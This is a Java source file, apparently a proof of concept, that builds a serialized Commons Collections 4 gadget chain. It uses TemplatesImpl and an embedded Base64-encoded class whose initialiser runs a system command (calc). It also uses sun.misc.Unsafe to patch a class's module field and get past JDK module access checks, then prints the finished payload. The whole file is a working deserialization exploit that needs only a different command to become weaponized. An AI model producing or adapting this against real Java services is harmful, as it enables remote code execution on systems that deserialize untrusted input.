package com.test;

import javassist.ClassPool;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.*;
import sun.misc.Unsafe;
import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class CC4_Bypass {

    public static byte[] getByteCode(){

        String payload = "yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbB" +
                "wAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3" +
                "RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAlDYWxjLmphdmEMAAoACwcAHQwAHgAfAQAEY2FsYwwA" +
                "IAAhAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACIBAARDY" +
                "WxjAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvb" +
                "GFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTG" +
                "phdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAIAAQAKAAsAAQAMAAAAHQABAAEAAAAFKrcAAbEAAAABAA0A" +
                "AAAGAAEAAAADAAgADgALAAEADAAAAFQAAwABAAAAF7gAAhIDtgAEV6cADUu7AAZZKrcAB7+xAAEAAAAJAAwABQACAA0AA" +
                "AAWAAUAAAAGAAkACQAMAAcADQAIABYACgAPAAAABwACTAcAEAkAAQARAAAAAgAS";

        byte[] decode = Base64.getDecoder().decode(payload);
        return decode;
    }

    public PriorityQueue BypassCC4() throws Exception {

        byte[] payload = getByteCode();
        byte[] nu11 = ClassPool.getDefault().makeClass("nu11").toBytecode();

        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        BypassJDKSecurity(CC4_Bypass.class,aClass);
        Object templates = aClass.getDeclaredConstructor().newInstance();
        setFieldValue(templates,"_name","nu11");
        setFieldValue(templates,"_bytecodes",new byte[][]{payload,nu11});
        setFieldValue(templates,"_transletIndex",0);

        Class<?> TrAXFilter = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");

        InvokerTransformer getAndSetObject = new InvokerTransformer(
                "getAndSetObject",new Class[]{Object.class,long.class,Object.class},
                new Object[]{Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"),60,"javax.xml"});

        InvokerTransformer get = new InvokerTransformer(
                "get",
                new Class[]{Object.class},
                new Object[]{null});

        InvokerTransformer setAccessible = new InvokerTransformer(
                "setAccessible",
                new Class[]{boolean.class},
                new Object[]{true});
        TransformerClosure transformerClosure = new TransformerClosure(setAccessible);
        ClosureTransformer setAccessibleGO = new ClosureTransformer(transformerClosure);

        InvokerTransformer getDeclaredField = new InvokerTransformer(
                "getDeclaredField",
                new Class[]{String.class},
                new Object[]{"theUnsafe"});

        ConstantTransformer getUnsafe = new ConstantTransformer(Class.forName("sun.misc.Unsafe"));
        Transformer[] transformers = new Transformer[]{
                getUnsafe,
                getDeclaredField,
                setAccessibleGO,
                get,
                getAndSetObject,
                new ConstantTransformer(TrAXFilter),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates}
                )
        };

        Transformer keyTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(keyTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(2,transformingComparator);
        BypassJDKSecurity(CC4_Bypass.class,priorityQueue.getClass());
        Field size = priorityQueue.getClass().getDeclaredField("size");
        size.setAccessible(true);
        size.setInt(priorityQueue, 2);

        return priorityQueue;
    }

    private static void BypassJDKSecurity(Class clazz, Class goalclass){
        try {
            Class UnsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = UnsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe)unsafeField.get(null);
            Object ObjectModule = Class.class.getMethod("getModule").invoke(goalclass);
            Class currentClass = clazz;
            long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));

            unsafe.getAndSetObject(currentClass,addr,ObjectModule);
        } catch (Exception e) {
        }
    }
    public static void setFieldValue(Object templates, String name, Object values) throws Exception {
        Field declaredField = templates.getClass().getDeclaredField(name);
        declaredField.setAccessible(true);
        declaredField.set(templates,values);
    }

    public static byte[] serialize(Object obj, boolean flag) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        if (flag) System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
        return baos.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        serialize(new CC4_Bypass().BypassCC4(), true);
    }
}
